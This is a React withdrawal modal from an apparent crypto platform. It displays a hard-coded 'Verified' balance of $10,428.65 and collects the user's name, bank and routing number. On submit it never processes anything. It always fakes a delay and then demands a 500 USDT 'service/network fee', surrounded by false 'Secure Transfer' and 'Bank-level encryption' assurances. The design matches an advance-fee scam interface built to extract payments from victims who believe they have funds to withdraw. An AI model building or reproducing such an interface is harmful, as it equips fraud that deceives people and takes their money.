import React, { useState } from 'react';
import { FaTimes, FaUser, FaBuilding, FaHashtag, FaExclamationTriangle, FaShieldAlt, FaClock, FaExternalLinkAlt } from 'react-icons/fa';
import { MdAttachMoney, MdClose } from 'react-icons/md';
import { SiTether } from 'react-icons/si';

const WithdrawModal = ({ isOpen, onClose }) => {
  const [formData, setFormData] = useState({
    fullName: '',
    bankName: '',
    routingNumber: '',
    amount: '1000'
  });
  const [error, setError] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Format amount to only allow numbers and decimals
    if (name === 'amount') {
      const formattedValue = value.replace(/[^0-9.]/g, '');
      setFormData({
        ...formData,
        [name]: formattedValue
      });
    } else {
      setFormData({
        ...formData,
        [name]: value,
      });
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setError('');
    setIsProcessing(true);

    // Simulate processing
    setTimeout(() => {
      // Show USDT transaction fee error
      setError('usdt_fee');
      setIsProcessing(false);
      
      // Shake animation for error
      const errorDiv = document.querySelector('.error-message');
      if (errorDiv) {
        errorDiv.classList.add('animate-shake');
        setTimeout(() => errorDiv.classList.remove('animate-shake'), 500);
      }
    }, 1500);
  };

  const handleMaxAmount = () => {
    setFormData({
      ...formData,
      amount: '10428.65'
    });
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-lg flex items-center justify-center p-4 z-50">
      <div className="bg-gradient-to-br from-gray-900 via-black to-gray-900 rounded-2xl w-full max-w-md border border-gray-800 shadow-2xl overflow-hidden animate-slideUp relative">
        {/* Floating Close Button */}
        <button
          onClick={onClose}
          className="absolute -top-3 -right-3 w-10 h-10 bg-gradient-to-br from-red-500 to-pink-600 rounded-full flex items-center justify-center text-white shadow-lg hover:scale-110 transition-transform duration-200 z-20 border-2 border-gray-900"
        >
          <MdClose className="text-lg" />
        </button>

        {/* Header */}
        <div className="relative p-6 border-b border-gray-800">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-emerald-600 rounded-xl flex items-center justify-center shadow-lg shadow-green-500/30">
                <MdAttachMoney className="text-white text-xl" />
              </div>
              <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-gray-900 rounded-full border-2 border-gray-800 flex items-center justify-center">
                <span className="text-green-400 text-xs font-bold">→</span>
              </div>
            </div>
            <div>
              <h3 className="text-xl font-bold text-white">Withdraw Funds</h3>
              <p className="text-gray-400 text-sm">Transfer to your bank account</p>
            </div>
          </div>
          
          {/* Balance Preview */}
          <div className="mt-6 p-4 bg-gradient-to-r from-gray-800/80 via-gray-900/80 to-gray-800/80 rounded-xl border border-gray-700 backdrop-blur-sm">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-400 text-sm font-medium">Available Balance</p>
                <p className="text-2xl font-bold text-white bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">
                  $10,428.65
                </p>
              </div>
              <div className="text-right">
                <div className="inline-flex items-center px-3 py-1 bg-green-500/20 rounded-full border border-green-500/30">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse mr-2"></div>
                  <span className="text-green-400 text-sm font-medium">Verified</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit}>
          <div className="p-6 space-y-6">
            {/* Full Name */}
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-3 flex items-center">
                <div className="w-8 h-8 bg-gray-800 rounded-lg flex items-center justify-center mr-3">
                  <FaUser className="text-green-500" />
                </div>
                Full Name
              </label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                className="w-full bg-gray-900/50 border border-gray-700 text-white px-4 py-4 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none transition-all placeholder-gray-500"
                placeholder="Enter your full name"
                required
              />
            </div>

            {/* Bank Name */}
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-3 flex items-center">
                <div className="w-8 h-8 bg-gray-800 rounded-lg flex items-center justify-center mr-3">
                  <FaBuilding className="text-green-500" />
                </div>
                Bank Name
              </label>
              <input
                type="text"
                name="bankName"
                value={formData.bankName}
                onChange={handleChange}
                className="w-full bg-gray-900/50 border border-gray-700 text-white px-4 py-4 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none transition-all placeholder-gray-500"
                placeholder="e.g., Chase Bank, Bank of America"
                required
              />
            </div>

            {/* Routing Number */}
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-3 flex items-center">
                <div className="w-8 h-8 bg-gray-800 rounded-lg flex items-center justify-center mr-3">
                  <FaHashtag className="text-green-500" />
                </div>
                Routing Number
              </label>
              <input
                type="text"
                name="routingNumber"
                value={formData.routingNumber}
                onChange={handleChange}
                className="w-full bg-gray-900/50 border border-gray-700 text-white px-4 py-4 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none transition-all placeholder-gray-500 font-mono"
                placeholder="123456789"
                required
                maxLength="9"
                pattern="\d{9}"
                title="Please enter a valid 9-digit routing number"
              />
            </div>

            {/* Amount to Withdraw */}
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-3">
                Amount to Withdraw (USD)
              </label>
              <div className="relative group">
                <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                  <span className="text-2xl font-bold text-gray-400">$</span>
                </div>
                <input
                  type="text"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  className="w-full bg-gray-900/50 border border-gray-700 text-white pl-14 pr-20 py-5 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none transition-all text-xl font-bold"
                  placeholder="0.00"
                  required
                />
                <button
                  type="button"
                  onClick={handleMaxAmount}
                  className="absolute inset-y-0 right-0 pr-4 flex items-center text-green-500 hover:text-green-400 text-sm font-semibold transition"
                >
                  MAX
                </button>
              </div>
            </div>

            {/* USDT Fee Error Message */}
            {error === 'usdt_fee' && (
              <div className="error-message p-5 bg-gradient-to-br from-yellow-900/20 via-amber-900/10 to-orange-900/10 border border-amber-700/50 rounded-xl">
                <div className="flex items-start mb-4">
                  <div className="flex-shrink-0">
                    <div className="relative">
                      <div className="w-12 h-12 bg-gradient-to-br from-yellow-500 to-orange-600 rounded-xl flex items-center justify-center shadow-lg shadow-orange-500/30">
                        <FaExclamationTriangle className="text-white text-lg" />
                      </div>
                      <div className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 rounded-full border-2 border-gray-900 flex items-center justify-center">
                        <span className="text-white text-xs">!</span>
                      </div>
                    </div>
                  </div>
                  <div className="ml-4 flex-1">
                    <div className="flex justify-between items-start">
                      <div>
                        <h4 className="text-lg font-bold text-amber-400 mb-1">Transaction Pending</h4>
                        <p className="text-gray-300 text-sm">
                          A required service/network fee of 500 USDT must be completed.
                        </p>
                      </div>
                      <button 
                        onClick={() => setError('')}
                        className="text-gray-400 hover:text-white ml-2"
                      >
                        <FaTimes />
                      </button>
                    </div>
                  </div>
                </div>

                {/* Fee Details */}
                <div className="grid grid-cols-2 gap-3 mb-4">
                  <div className="p-3 bg-gray-800/50 rounded-lg border border-gray-700">
                    <div className="flex items-center gap-2 mb-2">
                      <FaClock className="text-amber-400" />
                      <span className="text-gray-400 text-xs">Status</span>
                    </div>
                    <span className="px-2 py-1 bg-amber-500/20 text-amber-400 text-xs font-semibold rounded">
                      Pending Fee
                    </span>
                  </div>

                  <div className="p-3 bg-gray-800/50 rounded-lg border border-gray-700">
                    <div className="flex items-center gap-2 mb-2">
                      <SiTether className="text-green-400" />
                      <span className="text-gray-400 text-xs">Asset</span>
                    </div>
                    <span className="text-white font-medium">USDT</span>
                  </div>
                </div>

                <div className="p-4 bg-gray-800/60 rounded-lg border border-gray-700 mb-3">
                  <div className="text-center mb-3">
                    <span className="text-gray-400 text-sm">Amount Due</span>
                    <div className="text-2xl font-bold text-red-400 mt-1">500 USDT</div>
                  </div>
                  
                  <div className="text-center">
                    <span className="text-gray-400 text-xs block mb-1">Reference ID</span>
                    <code className="text-amber-400 font-mono text-sm bg-black/40 px-3 py-2 rounded-lg inline-block border border-amber-800/30">
                      USDT-PF-50001
                    </code>
                  </div>
                </div>

                {/* Additional Info */}
                <div className="pt-3 border-t border-amber-800/30">
                  <p className="text-gray-400 text-xs text-center italic">
                    This fee covers blockchain processing and service activation.
                  </p>
                </div>
              </div>
            )}

            {/* Action Buttons */}
            <div className="flex space-x-3 pt-2">
              <button
                type="button"
                onClick={onClose}
                className="flex-1 px-4 py-4 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-xl font-semibold border border-gray-700 hover:border-gray-600 transition flex items-center justify-center gap-2"
              >
                <MdClose />
                Cancel
              </button>
              <button
                type="submit"
                disabled={isProcessing}
                className={`flex-1 px-4 py-4 rounded-xl font-semibold transition flex items-center justify-center gap-2 ${
                  isProcessing
                    ? 'bg-gray-700 cursor-not-allowed'
                    : 'bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white shadow-lg shadow-green-500/20 hover:shadow-green-500/30'
                }`}
              >
                {isProcessing ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </>
                ) : (
                  <>
                    <MdAttachMoney className="text-lg" />
                    Proceed
                  </>
                )}
              </button>
            </div>
          </div>
        </form>

        {/* Security Footer */}
        <div className="p-6 bg-gray-900/60 border-t border-gray-800">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gray-800 rounded-xl flex items-center justify-center border border-gray-700">
                <FaShieldAlt className="text-green-500" />
              </div>
              <div>
                <h4 className="text-sm font-medium text-gray-300">Secure Transfer</h4>
                <p className="text-gray-500 text-xs">Bank-level encryption</p>
              </div>
            </div>
            <div className="text-right">
            </div>
          </div>
        </div>
      </div>

      {/* Add custom animations to index.css */}
      <style jsx>{`
        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(20px) scale(0.95);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
        
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
          20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        .animate-slideUp {
          animation: slideUp 0.3s ease-out;
        }
        
        .animate-shake {
          animation: shake 0.5s ease-in-out;
        }
      `}</style>
    </div>
  );
};

export default WithdrawModal;